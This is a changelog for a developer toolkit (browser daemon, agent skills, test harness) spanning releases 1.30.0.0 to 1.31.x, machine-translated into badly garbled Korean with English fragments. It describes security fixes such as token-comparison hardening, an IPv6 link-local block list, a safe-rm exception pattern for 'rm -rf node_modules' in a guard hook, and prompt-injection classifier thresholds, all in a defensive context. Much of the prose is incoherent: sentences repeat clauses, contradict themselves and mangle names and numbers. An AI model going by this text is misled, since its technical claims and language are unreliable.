## **7개의 기여자 PRs 땅. 3는 안전 또는 강하게 합니다.** ## **루트 토큰 비교, IPv6 링크-현지, NUL 성적표, 사이드바 탭, 탄력성, 모델 ID, CJK 탈출 - 모든 고정 된 하나의 파도.**

일곱 커뮤니티 PRs 토지, `/plan-eng-review`을 통해 손으로 찍은 Codex 외부 서적 검토는 파도 중반을 형성했다. 헤드 라인 수정은 실제 : root-token 인증 경로 no 더 이상 JS 문자 길이와 일치하는 멀티 바이트 입력에 던져하지만 UTF-8 바이트 길이, 직접 `http://[fe80::N]/` URL은 이제 같은 방법을 거부합니다 ULA 주소 이미, `gbrain put` 스트립 NUL 과거 성적 내용에서 바이트 그래서 Postgres는 쓰기를 거부하지 않으며 빌드 스크립트는 신선한 작업 no와 함께 실행할 때 눈물을하지 않습니다. no 문자열 no

원래 9-PR 계획의 두 PR은 Codex 붙잡은 짐 방위 문제 후에 후 후 후 후속 리뷰를 옮겼습니다: SVG-XSS 고침 (#1153)는 위생 통합 재건을 필요로 하고, 걸이 결합한 가변 교환 (#1141)는 플러그인 + dev-symlink 형태에 있는 런타임 검증을 필요로 합니다. 둘 다 그들의 자신의 PR로 땅을 둘 것입니다.

### 중요 한 숫자

v1.31.1.0에서 `main`에 대한 디프는 eng + Codex 검토 후 7 개의 착륙 PR에서 측정했습니다. 파는 의도적으로 repo 로컬입니다. no 새로운 의존성, no 위험 통합 변경.

| Metric | 0.0.1.1.0 과 | 0.0.0.0의 | Δ |
|---|---|---|---|
| 커뮤니티 PR | 3 | 7 | **+4** |
| 보안 / 고정 | 0 | 3 | **+3** |
| Behavior는 사용자가 배를 변경 | 1 | 7 | **+6** |
| 무료 시험 | 379 | 380 | +1 |
| 메모리-ingest 테스트 | 18 | 19 | +1 |
| LOC (기계적 리젠을 제외) | — | ~150 | — |
| SKILL.md 파일 재생 (CJK 전극 케이스) | — | 35 | — |
| Preamble byte 예산 | 36,500 | 39,000 | +2,500 |

7개의 출하된 PRs 덮개 3개의 종류. **보안:** 뿌리 군 UTF-8는 강하게, IPv6 연결 지역 차단해, sidebar 탭 인식 확장합니다 비교합니다. **정확한:** gbrain ingestion tolerates pasted-NUL transcripts는, unborn HEAD에 탄력을 건설합니다. **담당자: Mr. s.** AskUserQuestion preamble forbids `\uXXXX` escaping of CJK 현재 CJK는, CJK를 추적합니다.

### 사용자가 무엇을 의미하는지

`pair-agent`를 실행하면, 멀티바이트 token가 일치하는 것으로 예상되는 것으로, auth 경로가 충돌 대신 false를 반환합니다. `gbrain`에 NUL 바이트가 붙여진 경우, `invalid byte sequence`를 반환하는 대신 쓰기가 성공합니다. 브랜드의 새로운 지휘자 worktree에서 `bun run build`를 가져가면, commit가 완료되기 전에 완료된 commit를 실행할 수 있습니다. 사이드바 에이전트가 비-localhost 사이트에 탭을 보시면, 이제 실제로 URL과 제목을 볼 수 있습니다. Claude를 중국어로 긴 질문을하면 `\u`-escaped codepoints가 비센스 글리프로 렌더링됩니다.

### 항목화 된 변경

#### 추가

- **#1257** 확장명은 `tabs` 권한을 얻습니다. Sidebar 탭 인식 오프 로컬 호스트는 이제 동작합니다. `chrome.tabs.query()`는 `url`/`title`를 정의하지 않는 대신 `host_permissions` 외부 사이트로 불러옵니다. `snapshotTabs`는 `tabs.json`와 `active-tab.json`로 실제 값을 자동으로 건너뛰기 때문에, 실제 값을 매깁니다. 머리 위로: 이 확장의 허가 범위를 넓히고, 사용자는 다음 설치에 더 넓은 프롬프트를 볼 수 있습니다. @ Contributed @ Contributed @ Contributed.

#### 고정

- **#1416** `isRootToken` 일정한 시간 비교는 강하게 합니다. UTF-8 바이트 길이를 비교하기 전에 `crypto.timingSafeEqual`, 길이 일치 버퍼에 던지는. JS 문자열 길이 일치하지만 바이트 길이가 다르다. auth 경로에 충돌 대신 false를 반환합니다. 4 회귀 테스트는 멀티 바이트 길이의 잡기, 여분-prefix 길이 일치, 그리고 마지막으로 --Rat 길이와 같은 플립트 길이를 커버합니다.
- **#1411** `gstack-memory-ingest` 스트립 NUL 바이트에서 `gbrain put`로 배관하기 전에 성적표 몸에서 바이트. Postgres는 UTF-8 텍스트 열에서 0x00를, 그리고 몇몇 Claude Code 성적표는 NUL 안쪽에 과거 내용 또는 도구 산출을 포함합니다. 고침 용도 `body.replace(/\x00/g, "")` 이렇게 regex 리터럴 체재는 diffs에서 검토하고 지구 통제에 의하여 새로운 반항하는 편집기에서 살아남습니다. `test/gstack-memory-ingest.test.ts:376`는, `test/gstack-memory-ingest.test.ts:376`를 통해서 재떨어졌습니다.
- **#1249** URL validation now block direct IPv6 link-local navigation. `fe80::/10`는 `BLOCKED_IPV6_PREFIXES = ['fc', 'fd', 'fe8', 'fe9', 'fea', 'feb']`로 중앙 집중화되어 `http://[fe80::N]/`는 이미 ULA 주소로 차단된 동일한 경로로 거부됩니다. 이전에 링크-local guard는 AAAA 해결책 도중만 발사됩니다; 직접 리터 URL은 통해 미끄러지는. @hiSandog에 의해 공헌하십시오.
- **#1207** `bun run build`는 git HEAD를 누락하는 재실행합니다. 3개의 사슬을 낸 `.version`는 (`browse/dist`, `design/dist`, `make-pdf/dist`)를 각각 사용합니다. `{ git rev-parse HEAD 2>/dev/null || true; } > ...`는, 그래서 unborn HEAD는 빈 파일을 생성합니다. `readVersionHash`는 이미 빈/trim에 null을 돌려주고, CLI의 stale-binary check short-circuitsno는,no를 통해서 알려지지 않았습니다. @topitopongsala에 의해 기여.
- **#1205** AskUserQuestion preamble forbids `\uXXXX` escaping of non-ASCII characters. Adds rule 12 plus a self-check item: models that hand-escape CJK strings get codepoints wrong, so `管理工具` ends up rendered as `㄃3用箱`. Long ≠ escape. Keep characters literal. The new rule cascades through the gen-skill-docs pipeline; 35 SKILL.md files regenerate to pick it up. Contributed by @joe51317-dotcom.
- **#1392** 나머지 `claude-opus-4-6` → `4-7`의 기계적인 융기는 E2E eval suite를 통하여 참고합니다. `test/helpers/eval-store.ts` 및 5개의 `test/skill-e2e-*.test.ts` 파일을 커버합니다. @johnnysoftware7에 의해 공헌하는.

#### 기여자

- AskUserQuestion는 36,500 → 39,000에서 바이트 예산 래치드를 새로운 CJK 규칙 (rule 12 + 셀프 체크 품목) 흡수하기 위하여 전방합니다. 35 층 ≥2 기술을 위한 SKILL.md 파일을 단일 기계 투입으로 재생했습니다.
- Two PRs from the original 9-PR plan moved to follow-up reviews after Codex outside-voice caught load-bearing problems: #1153 (SVG sanitizer) needs the sanitizer integration rebuilt against the current `setTabContent` boundary in `browse/src/write-commands.ts:319` (the original PR removed `.svg` from the allowlist; the right fix is to keep it allowed and sanitize via DOMPurify before `setTabContent`). #1141 (CLAUDE_PLUGIN_ROOT)는 플러그인 설치 및 dev-symlink 모드 모두에서 실행 시간 검증을 필요로 하며, `investigate/SKILL.md.tmpl:107`의 비 frontmatter shell snippet에 범위를 확장합니다.
- 5개의 문 층 evals는 비 결정체/TTY 파의 첫번째 `test:gate`가 흔들림으로 표면을 뛰기 후에 quirks를 연출합니다 (`main`에 전 확고한, 그 후에 조정): `office-hours-builder-wildness` retiers `gate` → `periodic` 때문에 LLM-judge 창의적인 득점은 층 분류 규칙 당 주기성에서 속합니다. `plan-design-with-ui`는, 5개의 문 단계에 의하여 조정된 조정합니다 `plan-design-with-ui`를, 확립합니다 `plan-design-with-ui`를, 확립했습니다. `ask-user-question-format-compliance` 예산은 300s → 540s (포), 360s → 600s (PTY 회의), 420s → 660s (분 포장)을 수용하기 위해 `/plan-ceo-review`의 다발 구획은 substantive branch에 전방합니다. `benchmark-providers` gemini 연기는 접합기 결과에 모양 체크의 호의에 있는 brittle `toContain('ok')` assertion를 떨어뜨립니다. `skillify` 스크랩 프롬 타입-경로는 JSON 형태 변형 (`results`, `data`, `hits`, `{title, score}` 객체의 배열) 대신 리터럴 `"items":[` 키에 대한 윤활을 허용한다.
- Housekeeping: 3 소스 PRs는 v1.31.1.0 (#1242, #1394, #1393)로 흡수되어, merge SHA에 대한 신용 의견과 닫힙니다.

## [1.31.1.0] - 2026-05-10

## **3 작은 커뮤니티는 땅을 깨끗하게 수정합니다.** ## **`/careful`는 macOS에, Codex 단계 0는 칭, `/make-pdf` 설정은 오른쪽 장소에 실행합니다.**

`rm -rf node_modules` 은 BSD sed가 `\s` 을 이해하지 않기 때문에, BSD sed가 `\s` sed가 안전 예외 경로 대신 경고 게이트를 침묵적으로 타격 한 Codex 의 `## Step 0: Check codex binary` 헤더는 플랫폼 감지 전과 충돌했다. `/make-pdf` 의 SETUP 블록은 Bash 의 Bash 의 `## Step 0: Check codex binary` 의 `## Step 0: Check codex binary` 의 `## Step 0: Check codex binary` 의 `## Step 0: Check codex binary` 의 <f> 의 <f> 의 의 앞에 놓일 수 있었다. 각 수정은 scoped이며, 재발견 시험 (또는 템플릿 주문 invariant)로 배송하여 원래의 실패 모양을 잡아줍니다.

이 릴리스는 ~75 stale PR을 닫은 contributor-wave 삼기 패스로 나왔다. 각 기여자에 대한 특정 피드백을 집중한 11 후보자가 떨어졌으며, `/plan-eng-review` + Codex 외부 청구서 검토를 통해 생존자를 일렬로 세웠다. 추가 보안 PR (토큰 리거 타이밍 안전 비교)은 Codex 이후 코덱 - 리뷰 게이트에서 거부되었다. Codex는 대신 버드 / 4의 버퍼 공격을 갖는 버퍼 / 4의 버퍼런스를 갖는 버퍼런스를 갖게 될 것이다. 그 결과 PR에 대한 피드백으로 살아가는 것을 발견한다.

### 고정

- **#1242** `careful/bin/check-careful.sh`는 `[[:space:]]` 대신 `\s`를 안전한 rm 예외 regex에서 사용합니다. macOS sed -E는 `\s`를 지원하지 않습니다, 이는 예외 탐지를 끊습니다 - `rm -rf node_modules`는 이제 macOS에 경고문을 정확하게 건너 뛰고, 일치 Linux 행동. `detectSafeRmWorks()` 플랫폼에서 `test/hook-scripts.test.ts`에서 `rm -rf node_modules` 둘 다 플랫폼은 동일하게 bar.Tributy에 의해 시험됩니다.
- **#1394** Codex 기술 `## Step 0: Check codex binary`는 `## Step 0.4: Check codex binary`로 이름을 붙였습니다 그래서 더 긴 no는 새로운 플랫폼 탐지 전표 (또한 수를 놓는 단계 0)로 콜드합니다. `codex/SKILL.md.tmpl`와 재생된 `codex/SKILL.md` 둘 다 영향을 미칩니다. @mvanhorn에 의해 공헌하는.
- **#1393** `/make-pdf` MAKE-PDF SETUP 구획은 전술 Bash를 거쳐 오른쪽으로 전술상 발자국 후에, 이렇게 `$P`가 어떤 후에 어떤 후에도 참고든지 그것을 놓입니다. `{{MAKE_PDF_SETUP}}` placeholder 본에서 프로그램적인 삽입에 `generateMakePdfSetup`, `ctx.skillName === 'make-pdf'`에 문진 `generateMakePdfSetup`에 의하여 프로그램적인 삽입에 구현 스위치. `make-pdf setup ordering` 테스트 `test/gen-skill-docs.test.ts`는 SETUP 블록을 미리 조립하고 플랜 모드 / 원격 측정 / 워크플로 헤더 전에 앉아 있습니다. @jbetala7에 의해 기여했습니다.

## [1.31.0.0] - 2026-05-09

## **AskUserQuestion는 계획 파일에 조용히 묻혀 버리는 것을 멈추게 합니다.** ## **전혈의 영원히 전쟁은 삭제됩니다. 테스트 하네스는 번개된 질문을 보고 5개의 치열한 시험 변종이 사라집니다.**

v1.31 이후, `/plan-eng-review`, `/office-hours`, 그리고 AskUserQuestion을 통해 계획* 기술 표면의 나머지. "울백 변형이 호출되지 않을 때"폴백은 조용히 `## Decisions to confirm` 계획 쓰기 + ExitPlanMode는 "trivial fix" 예외와 함께 삭제됩니다. 이전에 조준하고 "outside plan mode, prose 및 stop" h 탈출으로 출력. Skill-text는 8개의 인라인 사이트와 6개의 장소가 동일한 fallback이 `plan-eng-review/SKILL.md.tmpl` 안쪽에 verbatim를 반복했습니다.

5개의 시험 변종은 지휘자 윤곽 아무도 실제로 실행한 (`--disallowedTools AskUserQuestion` 없이 등록한 MCP 변종, i.e. "neither AUQ 도구 외침") 삭제됩니다. 그들은 생산에서 존재하지 않는 국가를 시험했습니다: 진짜 지휘자 회의 기록기 `mcp__conductor__AskUserQuestion`, 그래서 모형은 항상 MCP 변종이 있습니다. 삭제한 변종은 장기간 흔들림 근원이었습니다.

테스트 커틀란을 살아가는 세 가지 새로운 원시를 얻었다: `isProseAUQVisible` (A/B/C/D) 및 번호 (1/2/3) prose AUQ 렌더링, LLM 판단을 사용하여 TTY 스냅 샷을 `waiting` / `working` / `hung`, `PlanSkillObservation`를 사용하여 `claude-haiku-4-5`를 사용하여 TTY를 사용하여 `waiting`를 추적하는 높은 물 표범을 얻은 후, 사용자가 "c11/>를 검사하는 것을 확인할 수 있는 것을 검사한다.

### 중요 한 숫자

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 기술 텍스트의 Fallback 항목 인라인 사이트 | 8 | 0 | -8 |
| "trivial fix"/ "prose-and-stop" 탈출 부 | 2 | 0 | -2 |
| 계획 형태 시험은 fictional `--disallowedTools`의 밑에 변형합니다 | 5 | 0 | -5 |
| LLM 심사 | 0 | 4 (waiting/working/hung/unknown) | +4 |
| 이 branch (주요 merge 후에)에 Diff 크기 | — | -721 / +928 | 그물 +207 |

삭제 된 "fallback"항은로드 베어링 지시 모델이 "둥근 비행 AUQs를 뚫는"에서 일반 탈출 해치로 합리화되었다. 일단 그것이 사라지면, 반대로 짧은 절과 STOP 게이트에서 `plan-eng-review` 섹션 1-4 대에 대한 반대 지시없이. `gate-tier plan-eng-finding-floor`는 건축 고정 착륙 이후 모든 실행에 전달합니다.

### 이 빌더를 위한 뜻

`/plan-eng-review` 또는 다른 플랜* 스킬을 실행하면, 4개의 발견 대신에 AskUserQuestion를 1개의 AskUserQuestion를 보게 됩니다. 하네스 개선 (prose-AUQ 감지기, LLM 판사, snapshot는 `~/.gstack/analytics/pty-judge.jsonl`와 `~/.gstack/analytics/pty-snapshots/` 때 `GSTACK_PTY_LOG=1`)에 `GSTACK_PTY_LOG=1`가 붙을 때 `~/.gstack/analytics/pty-snapshots/`에 기록합니다.

### 항목화 된 변경

#### 건축 수정
- `## Decisions to confirm` 삭제된 항목에서
  `scripts/resolvers/preamble/generate-ask-user-format.ts:12` (보스 지점: 플랜 파일 쓰기 AND prose-and-stop)
- 같은 낙하 절 삭제
  `scripts/resolvers/preamble/generate-completion-status.ts:29`
- 삭제 된 fallback 인라인 문장에서
  `plan-eng-review/SKILL.md.tmpl` (Step 0 + 섹션 1-4: 5 인스턴스) 및 `office-hours/SKILL.md.tmpl` (1 인스턴스)
- 결정이 사실 때 "만 건너뛰기 AskUserQuestion
  `plan-eng-review/SKILL.md.tmpl:204`에서 trivial" 예외
- 단 하나 단단한 규칙으로 대체하는: “no AskUserQuestion 변종이면
  도구 목록에서 나타납니다, 이 기술은 BLOCKED입니다. 정지, 보고 `BLOCKED — AskUserQuestion unavailable`, 그리고 사용자를 기다립니다.
- 생성된 모든 47개의 SKILL.md 파일 (default + 7개의 주인 접합기)

#### 시험 마구 primitives
- line-start 앵커링을 가진 `isProseAUQVisible` regex 발견자 추가
  그리고 꼬리 전용 네이티브 커서 게이트 (`test/helpers/claude-pty-runner.ts`); 8개 단위 테스트 커버 레터링 및 번호 형식, 임계 가장자리, 네이티브 커서 포함 및 중간 증거 거짓 positive 가드
- `judgePtyState` LLM <claude -p --model를 사용하여 판독
  claude-haiku-4-5 --최대 회전 1` with subscription auth (no API key env required), in-process cache by SHA-1 of normalized last-4KB snapshot, JSONL log to `~/.gstack/analytics/pty-judge.jsonl`
- 하이 워터 마크 플래그 `proseAUQEverObserved` 추가
  `waitingEverObserved` 에 `PlanSkillObservation`; truncated 증거 창에 대하여 재 실행 발견자 보다는 오히려 검사하십시오
- snapshot 로깅을 통해 `GSTACK_PTY_LOG=1`, 마지막 4KB의 덤프
  TTY 각 판단에 `~/.gstack/analytics/pty-snapshots/<test>-<elapsed>ms.txt`를 표시한다.
- `assertReportAtBottomIfPlanWritten` 이제 ENOENT (TTY-검출
  persist가없는 경로) 및 `outcome='asked'` 연기 실행 (첫 번째 AUQ, no 리뷰 보고서에서 종료)
- 유선 LLM 판단은 `runPlanSkillObservation`로 떨어졌다.
  `runPlanSkillFloorCheck` 오염 루프 : no 터미널 분류의 60s 후, snapshot 30s마다 판사를 호출합니다. `waiting` 베토레에, `outcome='asked'` 초기 반환

#### 시험 표면 변화
- `test/skill-e2e-plan-eng-multi-finding-batching.test.ts` 추가
  `runPlanSkillCounting`를 사용하여 (기간층) 4개의 파이팅 묘종 고정장치 (`FORCING_BATCHING_ENG`)를 사용하여 원본 성적 버그 모양을 반영합니다. 최소 3개의 리뷰-상 AUQs를 주장합니다.
- `test/skill-e2e-autoplan-auto-mode.test.ts`를 완전히 삭제했습니다
- 삭제된 시험 2 (`--disallowedTools AskUserQuestion`)에서
  `plan-ceo-plan-mode`, `plan-design-plan-mode`, `plan-eng-plan-mode` (kept 시험 1 기본 플러스 계획 - eng 계획 형태 시험 3 STOP 문)
- Removed `autoplan-auto-mode` entry from `test/helpers/touchfiles.ts`
  (E2E_TOUCHFILES 및 E2E_TIERS); 업데이트 `test/touchfiles.test.ts` assertion 카운트

#### 기여자
- 디버깅 사이클의 세 가지 에이전트 조사는
  로드 베어링 진단 단계: 건축 수정, prose-AUQ 감지기 디자인, 및 시험-fictional-state retraction. 작동되는 본: 의 신선한 컨텍스트 서브 에이전트 확인 부모의 정신 모델에 대한 실제 파일 내용에 대한 수정. Codex 검토는 "그들" 실제로 8이었다, 제안 된 멀티 핀딩 테스트는 `runPlanSkillFloorCheck`가 처음 AUQ를 종료하는 방법을 제공 할 것입니다, 그리고 기존의 테스트로 삭제 된 Codex.

## [1.30.0.0] - 2026-05-09

## **20개의 지역 사회는 1개의 파에 땅을 고칠하고, 첫번째를 위한 Windows + 코덱 표면의 CI를 두는 결산 수정을 더하기 위하여.**

Browse stops silently dropping `browse-console.log` writes (a regression from a missing variable declaration), the cold-start race that ENOENT'd one of every fifteen parallel daemons gets a per-process tempfile, and concurrent iframe detach finally clears refs symmetrically with main-frame nav. `codex exec resume` works on machines that ship `python` without the `python3` alias, and stops passing the `-C` and `-s` flags that the resume subcommand rejects. Windows 사용자는 bash.exe를 텔레메틱스 spawn트에 대한 포장을 얻을, `Bun.which`/`.cmd`/`.bat` 대신 베어 경로, NTFS ACL 에 작성된 모든 파일에 강하게 `~/.gstack/`. 두 개의 닫힌 고정 토지와 함께: `windows-free-tests.yml` 이제는 icacls + Bun.which 테스트 파일 (코드의 갭을 해제하는 것은 `codex exec resume --help`를 놓는 연기가 있는 경우, `codex exec resume --help`는 연기가 나면, `codex exec resume --help`를 놓는 연기가 나면, `codex exec resume --help`를 놓을 것이다.

### 중요 한 숫자

`bun test` (무료 계층, 452 테스트 패스) 및 게이트 계층 E2E를 통해 확인된 종료:

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| `console.log`의 지속 | swallowed every 1s flush due to `lastConsoleFlushed` ReferenceError | 선언, 디스크에 지속 | 관련 상품 |
| Concurrent daemon cold-start | 공유 `state.tmp` 경주 이름, N 스파셋에서 1 살 | per-process `tmpStatePath()` (pid + 4 임의 바이트) | no 더 많은 ENOENT |
| Iframe detach 처리 | refs는 iframe 자동 분리될 때 누출했습니다 (주요 구조 nav와 비대칭) | refs 비대칭 | 패티슬립 |
| `codex exec resume` 플래그 세트 | `-C "$_REPO_ROOT" -s read-only` (재고에 의해 거절 됨) | `-c 'sandbox_mode="read-only"'` + `cd "$_REPO_ROOT"` | 경고없이 작동합니다. |
| Codex JSON 파싱 | `python3`를 해독하십시오; 단지 `python`를 가진 기계에 끊기 | 프로브 `python3` 그 다음 `python`, 오류가 명확하지 않으면 | 기계에 더 |
| Windows 검색/make-pdf 바이너리 해상도 | bare-path probe missed `.exe`/`.cmd`/`.bat` | `Bun.which` + `GSTACK_*_BIN` 과도한 + 연장 묶기 | Windows 설치에 작동 |
| Windows 상태 파일 경화 | POSIX `0o600` 모드 비트 NTFS | icacls 상속 휴식 + 부여 전용 ACL 각 `~/.gstack/` 쓰기 | 실제적인 경화, 침묵하지 않은 no-op |
| Windows 원격 측정 간격 | `spawn(bash-script)` ENOENT는 Windows (`CreateProcess`는 shebangs를 거절합니다)에 조용히 | bash.exe는 PATH/`GSTACK_BASH_BIN` 과다리를 곱합니다 | Windows에 캡처된 원격 측정 이벤트 |
| 도메인-스킬 자동-promote | classifier_score에 관계없이 홍보 | `classifier_score > 0`에 문지르는 | adversarially-flagged 도메인은 quarantined를 유지 |
| 메모리 ingest에서 Shell-injection 표면 | `/bin/sh`를 통해 git cwd는 | `execFileSync` 파라미터로 cwd | 1개의 더 적은 주입 경로 |
| Windows 무료 테스트 CI 적용 | 3 테스트 파일 (클래드 빈, gstack-paths, 테스트 샤드) | 7 테스트 파일 (+ icacls, 보안 원격 측정, 검색클라이언트, pdftotext) | 4개의 새로운 표면 CI |
| Codex CLI 플래그-세마틱 테스트 | SKILL.md 텍스트에서만 복사 | 라이브 `codex exec resume --help` 연기 (코드가 부패될 때 스키) | 홀덤 게임 |

PR 카운트: 21 커뮤니티는 + 4 사내 후속 조치 (#1302 템플릿 포트, CL-1 Windows CI 확장, CL-2 코덱 플래그 연기, server.ts 충돌 해결)를 합병합니다. 기여자 크레딧 : 13 고유 저자. 테스트 카운트는 452 → 459 (4 합병 된 PR의 새로운 테스트 + 3 CL<variants에서 CL<variants>에서 갔다.

### 이 빌더를 위한 뜻

Windows install에 있는 경우, `~/.gstack/`가 실제로 접근 제한되는 방출 (icacls 보조금), 찾아서 make-pdf가 오른쪽 `.exe`를 찾아서, bash-shebang telemetry는 바닥에 떨어지는 것을 멈추는 방출입니다. `GSTACK_BROWSE_BIN`/ `GSTACK_PDFTOTEXT_BIN`/ `GSTACK_BASH_BIN`를 과소하게 놓으십시오. `/codex` 기술을 사용하는 경우에, 회의는 `python`/>를 가진 기계에 작동하고 `python`를 떨어뜨리고 `python`를 떨어뜨리고 `python`를 갑니다. 병렬에 여러 개의 검색 데몬을 숨기면 (CI shards, 냉전 레이스, 멀티 태 지휘자), per-process tempfile fix는 no를 더 이상 훔치는 파일에 대해 훔칩니다. `gbrain autopilot --install`를 한 번 실행하고 그것에 대해 잊지 마십시오.

### 항목화 된 변경

#### 추가

- **#1306** Windows bash.exe는 원격 측정 간격을 위해 감싸 (`browse/src/security.ts`). 명예 `GSTACK_BASH_BIN`/`BASH_BIN` env override, `Bun.which('bash')` (표준 Windows install)에 Git Bash로 뒤떨어졌습니다. bash가 비정질 때 null을 돌려보내어서 말썽을 끄는 것은 청소하게 멈춥니다. @scarson에 의해 공헌하십시오.
- **#1307** `Bun.which`- `make-pdf/src/browseClient.ts`와 `make-pdf/src/pdftotext.ts`를 위한 바이너리 해결책. `.exe`/`.cmd`/`.bat`를 Windows에 놓은 후에 probes `GSTACK_BROWSE_BIN`/`GSTACK_PDFTOTEXT_BIN` overrides. 다른 2개의 이진 해결자에 `claude-bin.ts`에서 v1.24 본을 확장하십시오. @scarson에 의해 공헌하는.
- **#1308** NTFS ACL `~/.gstack/` state file (`browse/src/file-permissions.ts` is a new helper). `writeSecureFile` 및 `mkdirSecure` invoke `icacls /inheritance:r /grant:r <user>:(F)` on Windows; POSIX `chmod 0o600`는 불변을 일합니다. 과정 당 첫번째 icacls 실패는 통보 선 "비명한 파일이 이 기계에 다른 계정에 의해 읽기 시킬지도 모릅니다"로 한 번 기록됩니다; 나중에 침묵하는 스팸에 의해. @ Contrisonscartrison@contrison.
- **#1316** Python3-or-python probe in `codex/SKILL.md.tmpl`. `python3`를 `python`, PATH에 불이 없는 경우에 명확하게 녹여. @jbetala7에 의해 공헌.
- **#1339** `browse/src/browse-client.ts` env 핸들링에 있는 엄격한 정수 검증. 부분적인 정수는 이제 침묵적으로 truncating 보다는 오히려 던졌습니다. @hiSandog에 의해 공헌하는.
- **#1369** `classifier_score > 0` 도메인 스킬 자동 프로모드에 게이트 (`browse/src/domain-skills.ts:248-320`). 각 다른 허리즘이 홍보하는 경우에도 Quarantined 도메인은 quarantined. @garagon에 의해 기여.
- **CL-1** Windows free-tests CI lane는 이제 `browse/test/file-permissions.test.ts`, `browse/test/security.test.ts`, `make-pdf/test/browseClient.test.ts`, `make-pdf/test/pdftotext.test.ts`를 실행합니다. 4개의 시험 파일이 이미 `process.platform`를 통해 그들의 assertions를, 그래서 동일한 파일에 POSIX 및 Windows lanes 및 운동은 관련 branch만 실행합니다.
- **CL-2** 라이브 코덱 CLI 플래그 매틱 연기 (`test/codex-resume-flag-semantics.test.ts`). `-c`/`sandbox_mode` 존재 및 최고 수준 `-C` 부재를 위한 `codex exec resume --help`를 프로브 `codex exec resume --help`; 코드가 실패하지 않는 경우에 건너뛰기.

#### 변경

- **#1270** `codex exec resume` invocation in `codex/SKILL.md.tmpl` drops `-C "$_REPO_ROOT"` and `-s read-only` (두 개의 재개 거부), `-c 'sandbox_mode="read-only"'` config 및 `cd "$_REPO_ROOT"`를 대신 사용합니다. 회귀 테스트 `codex/SKILL.md resume command only uses resume-supported flags`를 추가합니다. @jbetala7에 의해 기여합니다.
- **#1273** `design/prototype.ts` (시제품 스크립트만 — 주요 디자인 CLI는 변경되지 않습니다) `OPENAI_API_KEY`에서 OpenAI 열쇠만 읽습니다. 산출 파일 이름은 `[a-zA-Z0-9_-]`에 단지 연기됩니다. `~/.gstack/openai.json` 파일 fallback는 시제품 스크립트에서 제거됩니다; `design/src/auth.ts`와 `design/src/cli.ts`는 아직도 주 CLI 교류를 위해 그것을 지원합니다. @orbiscurity.0security.에 의해 공헌하는.
- **#1302** /ship 계획 완료 게이트 (`ship/SKILL.md.tmpl` + `scripts/resolvers/review.ts`)는 Verification 형태 분류 (DIFF-VERIFIABLE/CROSS-REPO/ EXTERNAL-STATE/ CONTENT-SHAPE), UNVERIFIABLE 분류, per-item 확인 문 (no 담요-firm AskUserQuestion/>/>/>/AskUserQuestion/>/>-SHAPE)를 추가합니다.
- **#1332** /ship 단계 12 fail-fast probe 기초 branch를 위해 `ship/SKILL.md.tmpl`. 12를 단계로 비정질 기초에 대하여 달리기에서 막습니다. @Jasperc2024에 의해 공헌하십시오.
- **#1337** `design/src/variants.ts`는 429 응답에 `Retry-After` 헤더를 명예를 줍니다. 비율 제한된 엔드포인트에 대하여 thundering-herd retries를 방지합니다. @stedfn에 의해 공헌하는.
- **#1362** `test/helpers/providers/gemini.ts`는 레거시 위치와 함께 새로운 `~/.gemini/oauth_creds.json` auth 경로를 검출합니다. @abigail-atheryon에 의해 공헌하십시오.
- **#1366** `browse/src/browser-manager.ts`는 `--no-sandbox`를 뿌리로 실행할 때만 추가합니다 (Linux/WSL2), 불조건적으로. @furkankoykiran에 의해 공헌하는.
- **#1368** `bin/gstack-memory-ingest.ts`는 `execFileSync` 매개변수를 통해 git cwd를 `/bin/sh` invocation로 교환하는지 통과합니다. 1개의 더 적은 포탄 주입 종류. @garagon에 의해 공헌하는.

#### 고정

- **#1309** `let lastConsoleFlushed = 0;` 선언 `browse/src/server.ts`. 모든 1초 `flushBuffers` 진드기는 제비된 ReferenceError를 던졌습니다; `browse-console.log`는 이 회귀 이후 모든 생산 배포에서 결코 쓰지 않았습니다. @yashkot007에 의해 기여했습니다.
- **#1310** per-process `tmpStatePath()` for state-file write in `browse/src/server.ts`. concurrent daemons spawned (15-parallel cold-start reproducer)가 뿌려진 경우 이름에 공유 `state.tmp` 리터럴 경주. pid + 4 랜덤 바이트의 suffix는 각 작가에게 독특한 경로; 원자 이름은 여전히 최종 상태에 지속되는 작가-wins를 제공합니다. @ykoasht007에 의해 기여했습니다.
- **#1311** `getActiveFrameOrPage` `browse/src/tab-session.ts`는 refs 비대칭으로, iframe auto-detaches가 기존의 메인 프레임 해군 경로와 일치할 때 비대칭합니다. @yashkot007에 의해 기여했습니다.
- **#1297** 한국어 / CJK IME는 사이드바 터미널 (`extension/sidepanel-terminal.js`, `browse/src/terminal-agent.ts`, `extension/sidepanel.css`)에서 렌더링을 입력했습니다. 구성 상태 보존, 문자 폭 수정. @realcarsonterry에 의해 기여했습니다.
- **#1333** `plan-devex-review/SKILL.md.tmpl`에서 피임약 계획 형태 핸디케이크 제거 (기술은 동시에 계획 형태를 주장하고 계획 형태를 입력하는 사용자를 요구하고). @Jasperc2024에 의해 기여.

#### 문서

- **#1290** `CLAUDE.md`와 `ARCHITECTURE.md` 프롬프트 주사계는 `browse/src/security.ts` (BLOCK 0.85, WARN 0.60, LOG_ONLY 0.40 - 문서는 이전 숫자로 편입했습니다). @brycealan에 의해 공헌하는.
- **#1338** README per-skill symlink uninstall snippet 수정 (이전 단어는 프로젝트 로컬 symlink보다 오히려 글로벌 기술 디렉토리를 `rm`일 것입니다). @stedfn에 의해 기여.

#### 기여자

- 파는 `/plan-ceo-review` (단 하나 파 + bisect-discipline merge 주문), `/plan-eng-review` (지도 5 교차 PR 비등 쌍을 가진 명시된 해결책 규칙 + 바짝 죄는 `gh pr checkout N -b pr-N` 구문), `/codex` 외부 청구서 검토 (각각 6개의 실제적인 과실 및 2개의 과정 개선은 둘 다 내부 검토 놓친; 크로스 모델 계약은 14%). 모든 검토는 merge의 앞에 통합되었습니다; 두 CI 갭 코덱 조각은 CL-1과 CL-2 이 같은 릴리스에서 배를 닫는 수정이되었다.
- 계획에서 문서화 된 5 개의 크로스 PR 충돌 쌍 (#1316↔#1270 코덱 재시작, #1309→#1310→#1308 server.ts state writes, #1366↔#1308 browser-manager, #1306↔#1308 security.ts, #1332↔#1302 ship Template) 모든 표면 처리는 예외적으로 `browse/test/server-tmp-state-path.test.ts` #1310 #1308 security.ts #1332 #1302 icacls는 여전히 다른 모든 `writeSecureFile` 전화 사이트에 적용된다 #1308 도입 (`auth.json`, `mkdirSecure` 경로, 등).
